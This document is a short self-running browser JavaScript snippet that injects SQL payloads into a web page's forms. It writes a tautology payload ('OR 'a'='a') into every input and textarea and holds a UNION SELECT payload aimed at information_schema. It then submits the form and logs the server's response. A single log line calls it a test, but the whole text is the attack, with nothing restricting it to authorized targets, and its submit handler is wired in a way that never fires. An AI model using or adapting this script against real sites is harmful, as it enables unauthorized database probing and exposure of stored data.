(function() {
  const sqlPayloads = [
    "' OR 'a'='a",
    "' UNION SELECT table_name, column_name FROM information_schema.columns --" 
  ];

  const formInputs = document.querySelectorAll('input, textarea');
  formInputs.forEach(input => {
    // Insert SQL injection into the input field
    input.value = sqlPayloads[0];  // Use the first payload from the array

    // Add event listener for form submission to prevent page reload
    const form = document.querySelector('form');
    if (form) {
      form.addEventListener('submit', (event) => {
        event.preventDefault();  // Prevent page reload
        console.log('Form submitted with SQL payload:', input.value);

        // You could use AJAX to send the form data and get the response without reloading the page
        // Example (make sure to adapt the endpoint and parameters):
        fetch(form.action, {
          method: 'POST',
          body: new URLSearchParams(new FormData(form)),
        }).then(response => {
          return response.text();  // Or response.json() if the response is JSON
        }).then(data => {
          console.log('Server response:', data);
          // You can display this data on the page or handle it as needed
        }).catch(error => {
          console.error('Error during SQL Injection test:', error);
        });
      });

      form.submit();  // Submit the form to trigger the SQL injection
    }
  });
})();